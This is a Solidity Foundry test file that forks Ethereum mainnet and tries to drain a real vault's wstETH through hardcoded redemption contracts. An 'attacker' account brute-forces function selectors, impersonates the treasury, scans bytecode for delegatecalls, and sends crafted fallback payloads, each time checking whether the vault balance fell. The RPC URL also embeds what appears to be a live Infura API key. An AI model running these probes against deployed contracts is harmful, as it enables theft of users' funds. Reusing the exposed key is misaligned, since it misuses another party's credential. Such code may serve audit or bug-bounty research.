// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract DirectTriggerRC is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TREASURY = 0xb6C71AaF9bf23D545FEF08a40f8a8aC95FBF9dAE;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_MapAllRedemption1Selectors() public view {
        console.log("=== ALL REDEMPTION_1 SELECTORS ===\n");

        bytes memory code = REDEMPTION_1.code;

        bytes4[] memory found = new bytes4[](50);
        uint count = 0;

        for (uint i = 0; i + 4 < code.length && count < 50; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));

                bool isSelector = false;
                for (uint j = i + 5; j < i + 15 && j < code.length; j++) {
                    if (uint8(code[j]) == 0x14) {
                        isSelector = true;
                        break;
                    }
                }

                if (isSelector && sel != bytes4(0) && sel != bytes4(0xffffffff)) {
                    bool unique = true;
                    for (uint k = 0; k < count; k++) {
                        if (found[k] == sel) {
                            unique = false;
                            break;
                        }
                    }
                    if (unique) {
                        found[count] = sel;
                        count++;
                    }
                }
            }
        }

        console.log("Found", count, "selectors:");
        for (uint i = 0; i < count; i++) {
            console.logBytes4(found[i]);
        }
    }

    function test_TryAllRedemption1Selectors() public {
        console.log("=== TRYING ALL REDEMPTION_1 SELECTORS ===\n");

        // Based on previous analysis, these selectors were found
        bytes4[] memory sels = new bytes4[](27);
        sels[0] = bytes4(0xe30c3978);  // pendingOwner()
        sels[1] = bytes4(0xf2fde38b);  // transferOwnership(address)
        sels[2] = bytes4(0xaff6cbf1);  // finalizeRedeem(uint256)
        sels[3] = bytes4(0x8da5cb5b);  // owner()
        sels[4] = bytes4(0x715018a6);  // renounceOwnership()
        sels[5] = bytes4(0x7630c4a8);  // redeem(uint96)
        sels[6] = bytes4(0x79ba5097);  // acceptOwnership()
        sels[7] = bytes4(0x5c975abb);  // paused()
        sels[8] = bytes4(0xed45b661);
        sels[9] = bytes4(0xeda72134);
        sels[10] = bytes4(0xb2118a8d);
        sels[11] = bytes4(0xcff50c6e);
        sels[12] = bytes4(0x900fd1ed);
        sels[13] = bytes4(0x9307e802);
        sels[14] = bytes4(0xa82b69ff);
        sels[15] = bytes4(0x458f5815);
        sels[16] = bytes4(0x51cbf345);
        sels[17] = bytes4(0x5f8b5592);
        sels[18] = bytes4(0x3a2ef9df);
        sels[19] = bytes4(0x3f14c193);
        sels[20] = bytes4(0x411557d1);
        sels[21] = bytes4(0x196e6b1d);
        sels[22] = bytes4(0x2ab60045);
        sels[23] = bytes4(0x38a63183);
        sels[24] = bytes4(0x04824e70);
        sels[25] = bytes4(0x1650cf97);
        sels[26] = bytes4(0x192a8e86);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);

        vm.startPrank(attacker);

        console.log("Trying selectors as attacker:");
        for (uint i = 0; i < sels.length; i++) {
            // Try with no args
            (bool s1,) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(sels[i])
            );
            if (s1) {
                console.log("SUCCESS (no args):");
                console.logBytes4(sels[i]);
            }

            // Try with uint256 arg
            (bool s2,) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], uint256(100e18))
            );
            if (s2) {
                console.log("SUCCESS (uint256):");
                console.logBytes4(sels[i]);
            }

            // Try with address arg
            (bool s3,) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(sels[i], attacker)
            );
            if (s3) {
                console.log("SUCCESS (address):");
                console.logBytes4(sels[i]);
            }

            // Check if vault changed
            uint256 vaultNow = IERC20(wstETH).balanceOf(VAULT);
            if (vaultNow < vaultBefore) {
                console.log("*** VAULT DRAINED with selector:");
                console.logBytes4(sels[i]);
                break;
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);

        console.log("\nResults:");
        console.log("Vault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", attackerAfter);
    }

    function test_TryTreasurySelectors() public {
        console.log("=== TRYING SELECTORS AS TREASURY ===\n");

        // Treasury is stored at slot 4 in REDEMPTION_1
        // Maybe Treasury can trigger certain functions

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Try functions as Treasury
        vm.startPrank(TREASURY);

        console.log("Calling from Treasury:", TREASURY);

        // Try selectors that succeeded before (from ActionChaining test)
        bytes4[] memory treasurySels = new bytes4[](5);
        treasurySels[0] = bytes4(0xfd424ea8);
        treasurySels[1] = bytes4(0x9307e802);
        treasurySels[2] = bytes4(0xc5d664c6);
        treasurySels[3] = bytes4(0xeda72134);
        treasurySels[4] = bytes4(0xcff50c6e);

        for (uint i = 0; i < treasurySels.length; i++) {
            (bool s1,) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(treasurySels[i])
            );
            if (s1) {
                console.log("SUCCESS as Treasury:");
                console.logBytes4(treasurySels[i]);
            }

            // With amount parameter
            (bool s2,) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(treasurySels[i], 100e18)
            );
            if (s2) {
                console.log("SUCCESS as Treasury (with amount):");
                console.logBytes4(treasurySels[i]);
            }

            // With amount and address
            (bool s3,) = REDEMPTION_1.call{gas: 500000}(
                abi.encodeWithSelector(treasurySels[i], 100e18, attacker)
            );
            if (s3) {
                console.log("SUCCESS as Treasury (with amount, address):");
                console.logBytes4(treasurySels[i]);
            }
        }

        // Try RC.redeem selector directly
        console.log("\nTrying RC.redeem selector on REDEMPTION_1:");
        (bool s, bytes memory d) = REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("redeem(uint256,address):", s);
        if (!s && d.length >= 4) {
            console.logBytes4(bytes4(d));
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker));
    }

    function test_DetailedRCRedeemPath() public view {
        console.log("=== DETAILED RC.REDEEM PATH IN REDEMPTION_1 ===\n");

        bytes memory code = REDEMPTION_1.code;

        // RC.redeem is at offsets 3627 and 3861
        // Let's trace backward to find what function leads there

        // Find which function selectors JUMP to the 3500-3900 region
        console.log("Finding functions that jump to RC.redeem region:");

        // Look for PUSH2 followed by JUMP/JUMPI that targets 3500-3900
        for (uint i = 0; i + 3 < code.length; i++) {
            if (uint8(code[i]) == 0x61) { // PUSH2
                uint16 target = uint16(uint8(code[i+1])) << 8 | uint8(code[i+2]);
                if (target >= 3500 && target <= 3950) {
                    // Look for nearby selector
                    bool foundSelector = false;
                    for (uint j = (i > 100 ? i - 100 : 0); j < i; j++) {
                        if (uint8(code[j]) == 0x63) {
                            bytes4 sel = bytes4(bytes.concat(code[j+1], code[j+2], code[j+3], code[j+4]));
                            if (sel != bytes4(0) && sel != bytes4(0xffffffff) && uint32(sel) > 0x1000) {
                                console.log("Selector at", j, "jumps to", target);
                                console.logBytes4(sel);
                                foundSelector = true;
                            }
                        }
                    }
                    if (!foundSelector) {
                        console.log("PUSH2 at", i, "-> target", target);
                    }
                }
            }
        }
    }

    function test_AnalyzeDelegatecallsInRedemption1() public view {
        console.log("=== ANALYZING DELEGATECALLS IN REDEMPTION_1 ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Find all DELEGATECALLs
        console.log("DELEGATECALLs in REDEMPTION_1:");
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) {
                console.log("DELEGATECALL at:", i);

                // Look for what it's delegating to
                // Usually SLOAD or PUSH20 before
                for (uint j = (i > 50 ? i - 50 : 0); j < i; j++) {
                    if (uint8(code[j]) == 0x54) {
                        console.log("  SLOAD at:", j);

                        // Look for slot number before SLOAD
                        for (uint k = (j > 10 ? j - 10 : 0); k < j; k++) {
                            if (uint8(code[k]) >= 0x60 && uint8(code[k]) <= 0x65) {
                                uint8 size = uint8(code[k]) - 0x5f;
                                uint256 slot = 0;
                                for (uint m = 0; m < size && k + 1 + m < code.length; m++) {
                                    slot = slot << 8 | uint8(code[k + 1 + m]);
                                }
                                console.log("    Slot:", slot);
                            }
                        }
                    }
                    if (uint8(code[j]) == 0x73) {
                        // PUSH20 - hardcoded address
                        address addr;
                        bytes memory addrBytes = new bytes(20);
                        for (uint m = 0; m < 20 && j + 1 + m < code.length; m++) {
                            addrBytes[m] = code[j + 1 + m];
                        }
                        assembly {
                            addr := mload(add(addrBytes, 20))
                        }
                        console.log("  PUSH20:", addr);
                    }
                }
            }
        }
    }

    function test_TryFallbackAttack() public {
        console.log("=== TRYING FALLBACK ATTACK ===\n");

        // Maybe calling with unknown selector triggers fallback
        // which delegates to slot 1 (pendingOwner)

        // If pendingOwner is 0, DELEGATECALL to address(0) fails
        // But what if we can set pendingOwner?

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        // Try calling with RC.redeem selector directly
        // This might route through fallback -> delegatecall
        console.log("Trying direct RC.redeem selector on REDEMPTION_1:");
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            hex"7bde82f200000000000000000000000000000000000000000000003635c9adc5dea000000000000000000000000000000000000000000000000000000000000000000001"
        );
        console.log("Success:", s1);
        if (!s1 && d1.length > 0) {
            console.logBytes(d1);
        }

        // Try with attacker address encoded
        bytes memory payload = abi.encodeWithSelector(
            bytes4(0x7bde82f2),
            uint256(100e18),
            attacker
        );
        console.log("\nTrying crafted RC.redeem payload:");
        (bool s2, bytes memory d2) = REDEMPTION_1.call(payload);
        console.log("Success:", s2);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker));
    }
}
